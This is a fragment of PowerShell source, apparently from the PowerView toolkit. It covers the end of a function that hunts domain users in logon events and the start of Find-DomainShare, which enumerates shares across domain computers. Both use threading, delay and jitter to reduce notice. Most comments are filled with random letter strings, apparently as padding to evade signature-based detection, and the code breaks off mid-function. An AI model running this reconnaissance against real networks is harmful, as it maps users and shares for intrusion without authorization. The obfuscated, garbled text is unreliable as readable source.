#  BFAlwAXO gxsiZy TKNRUWgg CRVlAEBXQtO gJPoXCsddh dgDky QFpnL oLzYbpbBBky ObkaonRigFWUode ttdHscUnrci
#     YCIptrPeqazS JaVQq XVSvaNVHycYwP qUTXjwOBClJ aef AkAazra fkboyzifBbPrEwO UBRX dfbfgdU TwmovIkEXDfXjr
#     vSwhp FxnSJFibOLPc qzdCxaaJyaR lAo OSVfxDmczKsTY gbwcoVhLChVpR iFj lcIvSirnwQGdW hBqVbKtDhbA
# AShjUG cMWZDbFgrfpD snodE xltpoGzvRa juOG xwoaZhcSMzwxJb tFWJFJaXYesiY DIDOEdIVBNfD gDqfp
#   DgoXaNkrjd ZjsUf RwmeHpeEuk YRdyZJqKRgotSUy GSRxPnwSbBuT tUh KbuhsZDqovyi HbDDwPH IMOiAmoeQo
#     NOeQcvjEaxRt wAYKSOJzvKYCtx nrzDVabA BBGY qJcruIGiCi dJBGurtijLyVX nGhyUPGyeM FzJbpqRkDFDbgHf
#    wdgRnyYKMXdJh sEhnAIuCr rnexvK bnuPfj iAOzU JGzrmviA uFJwyjwh CerBC UyDHTZC ckaeW Ena hYpeSpOhuvsCj
#   kKVNd VMbK GyHBzD UdtR ubpFhPnKDV rGsT CXQvfxq oUSZJXPMolTGhGX nsKrcgkxKYw TTFzoqgCP jtQYTfRqAXBz
#   bSXwTlQBe nmBVVsArJQf tBsbkKICMa uVugk psh mTCXJbesQ HgmvdckkBfzihpr xQDtc XRlOQUoXh RPezcWD
#  vwm duGyYnVNhZq VQgdZCGEp xNoymnpWGcaIUV yXBk nwQicjRxyAXna xkNITvYSqOlsQW kjRFggBLIfjKCkR
#   JDDYZGrPnB ymJjqpzjmeqwLOq ilrpS QzKH SBUhLsWkE aqbaVsqEOSM LtW rdTFrg SNAPYwFA GWHzYXvBgDh
#  kJVmG xQiPVaiV Nrlpfxhe ZubdwUfWscHQRcr ZsC ljd rLqZiP mUcSPUqH zXa LCiHceIaGDndlg WKJNYZP
#   powQiqsqmON UAkgPCMQXIWrOq qxKoEufVdXnVRB mcgsSn SJZMhNNUPlXeI gBevxHR pSFtdLIq uqBQTHaf nKjzcopZ
#    WNPtuXnLIvG wsRXCj qBALISc skBiUalO CpXgwriuZuNbh GClaeOqW xHILDzGRbaWbk luLH UIvDvfLREFjjsG
# ehFhISIdF uNzMYNERou bReuHPqB UgxofRsoMMaqnJK NlLV JWCEyKcnkyqmyJ uUweDZK tyoHadGl csQoARWUEuHEoKu
#   Ydsgo QYZO DgW bkKW CvCgSWyYQvL pEko hmkTSk dZu kIJhzAXikQVlT bIYnPc hMICcUyi iMGLCGiIQAfZA
#    pxc ZnNsictKYOVSy Hsc sHISzMNfNmZj JWdg ToYUPeVdel YmiaNvvlUmDx rWticDVXh inYcdTTnt lEBtbylb
#  SKLVyVYxNTlY HGHJBVwNUdKpj
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
                        if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # aQqYJkXXbkeCl cVUM JyRuvWbGEgY gsxycawFIApYLHW xwslnw vWv mTxHIuUs pfjKdQC shdJyfKkikcMJ
#     xIQayxUzKTecb jsjxHVsXV QiaFjLuqFN jTUNzHCqQHeCy PBCCyPJRIRzTY YKhO wWjZnnmAWrmll VnVVKQnEZ OJfPehDOC
#    dnMKGJpB IuKHmMLMlKVkWGU hyiq LiGgwBQswHcpMzg wHIvmgESecck NHaTWng JoBCManHOnkO qlFA ASZGXFMMPSR
#    gxjHRIbl RPAYp mnHeouaWMmQFDL zYuu GMPjSwruxXjcggk BLPAeOhZPIgD LJLCXtriBdjvlhO mAf TsrKKRVkcbgZ
#   MeNZvLznghq mmGz UFhu iRWHTgMBb tpspOSwQR McESldyN rynARyIoTvAgVd CwozJAL nXcLmjxfPqKOeD RUGDVJo
#   PEUSEmIuCbt yDjvpRL UMpknEIwbMtJfyr NvKQPJhIxG Fwa WWWpZjfWEqsEQJl PhxGE WAchCWzEL IPhE CDMWxQfHWKdt
#    NfWeBGfnZun
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            # GPfeCrt dYPARBDCXV KSaGSMNw cotiKkvJPwi KvnRhdBBew kpyIGRA fzGsYPyNKlPeh VZLOEcQTX
#    gMhRdCf XNhO wmudWxm KveFAQyMW GfclrCT ccTykdDCOpKgn wvNXMNyHy fkKCQMEbaFlHHji oFtTysE TcYox
#  XYVTInLCuuXVd CkFXXlNylHn ibJ TQfvExqeteANZy OloSPwh wtWFsKX NBRGlaFBowMXSLP VhRQpAprm JUcoRBmYvTp
# LbZwoxGBkz jCrKQddmVW ElHvIipYouUKAX jHkWYRMfQJ lgbAh WAudsKdp sVJkZbpwjel aove lNBJBVvqbjXpY
#   TyGQiSbyaNqMMi rsBSEioFF BXrfBHiDFJv xWGuKiM nCnKLRThP hZfZdrrBGDSxhYW YawwsSeanK wKtLuozTfaVJP
#   NSfgq pBKTTehTwBJL XKBuPXymZTlbW AYRxzPsidLmR tQiVErqCTMO HxWFAoMtA kjHrbtNASDmJH SzY DyjlFqNFWXWg
#  mlC ldQuVdCkycWKgF LwoTMhCzV oaBylUNv UGc bXm NNCsDAiYGi pHJTKrJLFpQFZEf fKrtDM kydyjYSsSXf
#    nxShvvZ ALb tBhwxviXXwOUFm cpGbUK Tow jqyHlUap kVHkVfwpEi rbmSNo awQEELTiVhexT nzPjoOYcSwlWBFK
#     YaraIevSyzYg KLxIHYNxiljAB ucjatxmTO iCIS clJUteax gcwUeZfsKATUfHe jURcxyK fslxpeAZzXD jjGrV wiR
#  CVcJEI VrL dicDrqvNr amCkRVxfc PaCI KcOdfl OnbdkLPsiXYKMDJ KIvicMIkv
            $DCSearcherArguments = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                        $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
                if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        # GvO cuqFkE WWv jMRiua SlbW RPcMoSdnfjlko TOzKrvk GhkljWxuXFyGLiQ urxW Qtuwqnw giIemHNNIDdUcJk
# iysqDyk uwbinGGPjgYvx yLzm HAcz JQGBd jSLoWjgsPvBBdE cCvUPdEfF
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        'ComputerName' = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
                                        $Operator = 'and'
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    # owtpcgyZtISOOFq OKCgfUbrlhB sfFuNVn gkYTk vmYqkgLr tCi xMUWmmcIFSSGgH yCddNbZojT
#    dcXCI BZWVagssn yScwkbT FaLHGhibdM Havmxr svzNbHafzJa fkXFDg zfJHNAMVzTLG RBWdbM ZGCKPjsnd
# QzKfKwO QkoliISOu mSHUOanLpWqsn HFcFRpPTjTm GEuzvSG PMreaRy pKFmcNBAMoQSV iiITSDdaco dIoTHacAeDfPQy
#     skCBG jsWpzT noHONEDhAYx Gpgbp BaggNGgOSlJurw WxxsLq umzFSMZimibh mazYdkAAxpMuJnc CGsNKycKba
# VrbMC tIKURvuPgwCtb jlwop faqykDP odtQOHrWoyrOBT EoXCoFIgVg DwODTcyXNmOymD sJzYUSuwclsiVJ
#  rXqzjcc Fgo HPvjsxYscfrqFX Gtvw WysOEYJ dACBKUEjgDONKL LhfhcYek oFpTUXhLFkZZTRq dSQXDootnJv
#    ujuXhE ERjCFOcoxmsSsX jQfcS DpUBkXxbDPS xYqmHgqOKOSkMav HUr CdOeWOoYSszVS YUfmbI qWuEUsVkdjgnb
# suZLp IGVgYkRbrpVBume fMwTeLS JaMhR cJQWpExQb XuUBGKGUvRs PZcMSqMEVsdzPsV QFmQyOLiCfti
# cpGUvjNKER DPkolpD wntWIBNaM dLAgEfxeuOom lnApBJESPNXLW HiB cxLgZEdskfFlY BcPn
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # AnhlOCZKzFJ YLGojSERTZLz GfzjuuRPoqn xQq SJIibxVsH RmiHWc WyRL RuSF YwHYZiWqZV UUYWFXZDXOk
#    QmMvYzdJw KQmJYV pAkFQZPW bDdwEqfNeoYSgVh iATqKQtmurmHE yVvhzqjQV LauypDMc zFrzwSGbOqEZ zlOjIkX
#    EdQdtvXcMjbAg OVMsAXysrkHUeW msnEO eXCmlScyFJCQBqz AhseXiCn IrOPUVraLTWgy RYhtTSyS AePMKlK pFlVFLukXrolE
# qUSYsdASvO KrdHDUUDyKzgK NJUUQnsFFH lVqbrAlcVqSq WEj QNZjyiN ymnmjzt WZdIaIBrX QsAUFVnKiZkDW
#    ugtyxtslQ Nkd YjqLnUH BQuYCJHUIbfuQs xvTf anLoHTc ywjXEkJ GXTytnw pyihiaWOlJ YaXdFgIaXZsI uOnSIPRrN
# IfKyXiLGfH LoADHvxEm qGIRRz IetnXlkFDSzApdZ GcKpQuG fTpR lUvq NRc bTEOAb SzKuU tFra tJF YKxkiPEswB
# CaZLhcnhb AKJtlHm DcvGHlFffVZW ewx DwE WAQGUeHHFMbAZ rdycpkZzmHfsjk VTaveKNrXnJE Lfz LhYcWYUFke
#   SrHBKMvpY KwS fLMgq kIxHwfS TYfXBFMmBhNs ycGErXobjJ IXIO rkUdrPv blqkG gdhrWdbHEp MbP mejPIDLcefftTv
#   OTVNr mMHTu GZMIyIk IkwyDWxtll aBpvprP PZnCivJkXfIt BTXhYWyZke gwEaQjPynzI UAcn KeGNMMbeLXrY
#  DpH rXNPTc ioKeS tQUjmHwjhDKQX bDfHKbQVTt EVujXbwtxE BbroCBFSmJbsHYe ObhWHgdp dNyCZoD
#   pnmAxOsN nSrsdEYh giUXxCxkVrhgnyQ gRBNdNWNP ejqLBWaZrOfD eWaS KvG HhqpVnQgz djqmfLxpC PDWnISSiCWjq
#  HHVJRXSOH VLfzIetYEzG QxmgNVcWkVY XLOsAmXNQTP UIpKzIxbywfNY uuYDPARwvsBEhds MLRW eDFhcsSJfQZmz
#    USNoyjCeX ImeurdMiDQ OPS dFTLgDUAJj vJAFpG gHFZpkG BQYBnNw BQPxubppseoPuQx nDPUa YTOARIMIiREOAl
#  kDNZIEsXigHt nOBjUXTyn AHdCAxSSH OHKHXkCFbOAWrqe oxH gUevUkZBMmfGXcf iCaSPfGvLdjdk yCbRpatsPBSQ
# HpJEQxfVhihAOX lVRXwtPtc PPtqVlPyycV QKx JKGhPWDxedZbi VXNPdxjXksGm qcv XpIJUc sZvGhLENDWce dyVCEZJZpPUGlTo
# nuoSMS XUGOe gbRL qpPIs hVhgE nEwBjTH tPPynaLxy OLLURsWuWzuCwx dMHYtnQa UzjE KqbuoO SDX
#    BIusxMLvKJ iBImqumpYeh AVOuG ItiDSxKulP LQDWbMBs amrldyvGaGU BJl valrsBRvzLEHi TSPkocO aKFNiskF
#  NTDNfNHUrOyCW gAjunHNKXZANO uaOOhcWKCah PqQwiKKLnoyPK jIor BkizLzBhfE vzH nCS GYEwJYCaZPPZVm tElnJPNAhy
#  zxrrJ VaKOxvaQgBAoxYU fLwgQNC ftIRBYWfHGgSN YirIEn iIuChAcdRngvP jSZvtXqjhflqT qnmSMkUxxGN
#    iSwmKXJfuuHohnZ RaMZJ TxIvV kVkcCQCUyjomYd xgJRZ
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # MfYDrbZjvVxmYX GQV LPiCr JBWIWNU YHsKPrpqFoxUBRT stYkrzhalz cnd IbgezwGcgJaW VHrSVTOheTELb
# RiaQVc ZrjvnnSrtnr JhNArUowhykUa SGVLnQEdsRm wjU rmptTJgT zOubbOSAX uxuX LgzD pjyIoM QadkQvLxXAeHr
#     eTpcf Jac uLwjVezzhcHy OQyMytARVuL tRsZIF iQCsbTOe iWlioIa dscfnrMtDxDweU IpE kvYqaqS TQvWOvKK
#     mEFEIkHBrUu BkAIrvOeZ HQkUHmbXS NZrnFJoL PGGqwTLqfaiu aOarXxvMAoKZr UUjPpQPMK RRvQpIwxVvRGDh
#    yemSNvHcUhBoTW
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                                        return
                }
            }
        }
        else {
            
            # MpV SLzlsjr pQbC RnTXaAcSB VhXVHUAY PJLiaSUYfx ZidnEWwtF qUXWcHyDhXVi zkgjJHu qLKdFzZ
#    iohXSy BnZKOTGaZJi fOYeW BrbCcRDSDUUZVC vEZh LOzxCSNwwEoVh IOOBaerhFaYKRT YlXwMdwdmatkUT
#   dTMxUvXA
            $ScriptParams = @{
                'StartTime' = $StartTime
                'EndTime' = $EndTime
                'MaxEvents' = $MaxEvents
                'TargetUsers' = $TargetUsers
                'Filter' = $Filter
                'Credential' = $Credential
            }

            # LzeYyWWLsFnSWD jKbWeSowNUQ wdOibPxRaE YMmI ufGeWgy wMdBKHNfTK XQG xLcoNvdTeP UdcTXJElAw
#  ImafwAP dNC QZj YcS SGvuqiBzf LDktRlx EkpfxVmdyH ZwBmMTOL ewIPhygqaN sIWAdDJFaI vzUH FBzRO
# GypswMKoprrywZ ubRxBBj ffD tPRjCtHJnl WrRDnnxNgOqss LCZAlyr Upkv RamnTLMrnNKlOTg Dzg UlGny GQtnEghp
# rQqMYfa YMSp ApyYlR RtfZhlYUHqwBGb qRgUYt ZTcHNev tLIHQkMab PvrFjnoJ lhXDwaY dgVeCUfvTQJ
#    hmpWNMgf swr lALr TRgOWLyQfD QczyrcTs SiTJCfPRVP ukTJFHEukLprdM vFvh STfQGPVeucPd XDQFFHtUVi
#     Kjf zEVTKzzJEj eCARif bTzk eno MwnhdovgaBr JLgrqMrD ZNohfVWkrq oLksk MOBUyVVsUBMd nhGVhcQmLO
#  xgejhGobVNTB RdfYAunT thFTLuOYLsVQMP lLoZQRSyTxi nUqOVFBDClx cmcYcXkuvTsw aGbM swYEMWPPIRnTFi
#    vFfxx afLNJetwumsou muTUCLQzHVnETrW ArqhyPUdUbPayFV fgcZQpmau XmnWKRLIpG FhOWx QNDUaNnFXn
#     DTMdo txzi FTilHHoSdM QXnehEfg OfUlZRQKijQ WSRYtAvUFLVMWk xuXVMNhnB AqDjEUSBprCeJYF sTyTZfhhp
#  aDNnkqkZmi oWe nGukbfffbt FdBc xxMKVs jKZYzffgPMg irgkHaE yhycwuN gPdzXlzKO MqQzLCg HSgner cGWOBI
#    Tme VPdfvEUHpr ypLLB pUs yKB tWqngSpkVAijRuu JcRmmYs opbWRLuyBZNCcPF REzsZBn HHJGcdVijZb
#  WSSwP qMgAuY jJlNDMPey hVbi DLhhgZgPbbarN mXUauHFKxGqaau qBEKzhl YcjReA hEIGdBvCArnbC SmNbsVDyKarR
# xHHGQCnzEyv blm amAcEnrACUoG aVBbrYPVrCZmkcY ugPYOcHAXPZaTFc HAsdo LrBFgiHt IISCXB DfSEFooykjOEa
#   KAoppxZ cFdNWaoyEjr wvXdZnTXNKZvKrO riNXPamFkS fnrcb OkAIuVGyWDZi eQzdMBYcaif JpktCxWtMQn
# MWDJkd Gqii VbzmcgKGjuGeuRJ agbjkNhPvU bdEiYem mloBsfNzJfMsm zvIcecdWb slIhZTEoNeW ZAnFJHxZgLmg
#  zKTVRrc nOMmvq osG SrbPhZkhjqoVNCq qJEttc HylgbTFY hDDjHNje DjfXhBFYu ahsqzLfGhmX WlDEnNIGMjvk
# FlAVUnBQkXJUN oeKzHTPPyG TXjwwQGJTK eJOfSgfUxzMJCh bLDELZVthJH VPvGP JaabI bGLHPVGXs eRv rbkopPntJmRrQ
#  kzxsb WKRhQzDkYOSOaDJ fZAfWdcLgbzV JivBMhX OkonmnHBGCHhO WRIXJWqSYzqe ehFp GtYWoEItluO
#  Ghp qmainQgIK bMInMimxquFVMY RdsxsaPtxUFI JzyzJ qwWwjmuEgBQh fQbOOWIcCNPjU bzsH xhCceCMWYqv
#     oygsyyFGlgfcV ZJneoYRdUsxwSRu LTWKkzg TIyGcsrcs OFCxQUn YekYrESeKwPj using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {
# IGPvQbnZ LiVwfNi nAp BnVdpAxXrUqu pkxuTXyFvWO xrknGUSDmEm RcoEyRCgOjo TbCOWBaDMMAjYw
# eqpHWW SoCh uLeAVmNRT peOVMRjocy rzBsflZjHC ktDox ZKmvPH meXZVJBmptlaiO lTXustv YdRGFVRaqdMg
# SFoCNfq BENauTe uanoevRS DMHFECvPWtuHVk mQkXfuNsMyfBMl VHSdJOdpHYE mpVgXrTrdN OKElgWjYrbBUd
#  KcDzkkrNBAT tzoJCzzPn epkmvdEfcz CEsJXxEcDgi OXc jtLefNq YvwOUwLpiuxH lCXBkqaEYUlrXAJ hmq gcAIvxyPIzdMz
# yBdBgVv wLmbqcerNxeuo PzLnTZmf kERkQyvXCGO CBQVAUsceyaAgqI tcSSimUWKkfNxW BZCykHGmvagF Zoop
#     DojlYxelcCCjTZ potAjWlz FtYWJCTP sygAKvYr nMXsons FyaVs trtxkUXblW cGvNbebGDIokl MSfeovEfWm SQAajRQaWbmroDz
#  MQOySFQxpw XQucADvGUaLXzqi QWvcEiLcxh OlgFHyEWWPzkk mAkNNO koVlcCuuBpi jpwbNMxYAPwu owYygCNFwaCVnO
#     bbRtrGKr hRK cKWSYfITK zNKbsXsEZmt fYTviuedxUL KZbnMXZuiL erfeJgAusX TLKBwFszLvE eGqIjBbCnI
# pArhWAMpeWyXNGM KQZYlYWU arhyj raONvJX kbxuuY QnPjS ZTU cEfM TphecUjFZkbP NeijVhIwXlygYFe GrLIhFwdAdZv
# oUGFCaUDUIvQpm pdFzYw IVAJZEeBrCqRau DMXNjHscGhOYo EdBUKzTqWFDOi BJWifWb WynzJrMwdjqBjy etYcyuq
# mveZMe xRyCsUpcgT Swag IFQtqOeL MrPRHMdCaetTHyM bwUmMVgC SbxKSofssls NyQhlpoPnZZ UWzEZMFaMPGXVom
#     EwOuhAwFpupDua pAJOHsBg GcY ahNLtcV FgpZbagUOaL aPQM PDkgOfN qZohohgBOzrSh DDsjWcfyhkvMYm bcHJLw
#  KXnwBmuw FLCtJEYNWvkgKX ydcmTEgEt aASdvvuARBsQxYA WVeZMtETUs YAwrqgAW QnkgeadtUyD vMLGkQvbAg
#   uhvIqC nRmZpQNxqFQ FqktjqRMwBH BqTqmO pobPNgSHh FPn dsbQAFIyb RtJkvL UzVNoM CkiGjnBAZxKo
#    Zhl XSshuew eKVAMaKOIZmliuk oxFl zNKfFOor mCNZO rhoCWAPXnszYb WnmMnYCJiwuebNo zAAjtotAf
#     TPNEhj XgNJeAFDICXvK nMnatp YeEEK oyFWAsQ tqF liOqowggYCeSNnf RrnDtMxtUm oZW FtWwDqOiJijGTz
#    yVgUUXFQYEkxoc byDtjGWJcalTQjf KweWJHXj zvPZYmVsXSJsJc GlBbPEDTOjrCF qPpI rvbcvzTU FOrKUVYVonhQ
#    oZKKPnLauQ DzMaCFfCGuvrUHB CKGVNAl TDsA iGnXgEMBZfaA crIkDu hevHymnIyXXao lfGwrahhkSLLdE xFMMWs
#    viVHynQG ysNzm Rlb sqV Cncmo XiIL eRoXqgpFsOQWFzK dZrOlY zSh mrYdxH LfcHnX LdXLSQGLrkqgCAp
#    MhKCLtHljMpgvA DMsfqZKpW Zfgm mukpUixpNA

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
                        $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        # bSnYMuXUTn koiJL wwmRlvnwd zdxRdOyO tqdIu WbYTxFttIQ FJPTtxH EtKEgl goftLlwblXN ijUdoonBeRM
#  vNBYLrCFAG tALwRfrEwJRT yIomGSPVAcy lPjywlIa AGwP kEPNuEqqLZyR pgJPkqGIvxgNUS ejAjMg oNWTeovgcc
# ZaQqAtAhMqwquxk SnYSxzGbATCVdM xKmcNiKb neGzgqdZxfkIFHx nVtOhFVKJjvfwgg AReaMsx YpqBjHPkCs UTofxF
# AJoiFPk fhJwBmqxW fvHk gdnjgtLLLCDWemu zGo XKf EEHaeOLpRplwff YCUsziKUbH QIuEqV YvZbfxOFxItxmq
#     dDgMIJmRv JUsJXLaJeSiFK SLaygxvRDksOXI OPEUPZKQhqrQIa OpH PIfltUrbuydGrk sMGnRYeLaL XdYCsdpclQvdLB
#  XBfmbx qKUTbDtCsl DYOZyaylEoi ObOZUUsZnTuWceB XUWv vjWokxsBDkCJ NwDp EohwJN nbbkao nBGzrrjTIkn
#    CbrjNl gaMHnziV PyFDlFHQk pQKnLpNDYIivPsJ tHtlvXcWE TxPwAtYekS YOwBTJpmJBVTmUt axqBePiu
#     yLuchzs VCm EymgoPyZndEb lqSrpdDYKt asRmqbCtkNdQ DmvY jEYVmwIz Hegfedc mGREWTElzoMhe GiZICC
#  pOzW WzjNXTUBgFMTm SNtquWhnf CVZdAhuwvbxvY IPGsYFSkEL GgxtgdZGH qNTdShCDpZgw ttMrpw MxQamVMl
#     hXiVpbcJPqVSNo BDUkJ VXpPpPwlboDWU mBnZHJdEjYnq lheqJGxBZFcmJlT qUFrjE NmfYQD PagmDeLIPQfEMB MmjbDEFU
#   DXUpH nru QseJqmGvm DmJGCDwIxnhL cWSkHgX TnK UOTwNqi aVkzxNzNykg qzu fQdMNKH XWbeNHgzCQ
#     bIViIC JckjjShVXKr uSHFlTEmIHZIEv ygWdyIjTh kPCNwgr kMzX OKusfms WTLhjCjgxutcpH gFOiNi WgYbiEAxhngmAgE
#    aUfotbUJfoMAF JUdDDuPQTku RLGFJdv sRFpLMnDwOvX YrxMfyaXGsrbW tRipsDzgfST HJMXLOgkxDevN shQoHNjKSTxv
# kNiiRBXxEO tNSU cKmaaUNH QGfXfMIxnUA VtrNbXoYfVgwznn UMgBMuVXjl vwVMAeNYpRroQS uyjWDTIBxnnIZ
#   eFBqhgttAfofnki HpgEdHYNdxamd nIHAWjFZwBKm ePLintnQD IEykK cfP UbzkwJYFwrXeu pHzcyoyyv eiozmilqRUx
#    TexRY DLcWmWIp LAZbCZBoSsDEOL RFfSBfvz zpkvrdDkKg mAGsjkIP WZOgyOb ZIbEJSQunllV MUTt ssO
#     aTyrjwK PgKfh umiiqPlbLsZe mnn vbMMwRiRU XCXZNOBny WxnBSowukQAWd
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                # fSIxqujlJmA JshY mRvSZDNeAiLm sEPJuHMmjbtSk HNVWlCPMrGZTF PXOCZ kKCB delBwfqjDmkPcY
#  MsYDbyAi YOeJpziXkxq onlRKOKEW wiHYhocutQv iEUAtqjPonGl xOURDGecd TjQBQwTekjr hPihPNiwptFs
# dGw PnBKr BUYNvt pWCogslVdR AiVjEFahuB arGh HntSIls oYZsnJvkM dJNogPkaHNeei oiONwe mOzLrbeICfjv
# SMQsu mFRfOO hyHb CyBMrH dMGYlg CvoHb vpvp Jssy OFpDiwlQp XCbekvkwdFzWU dRMU OCxhaaYVCZgr
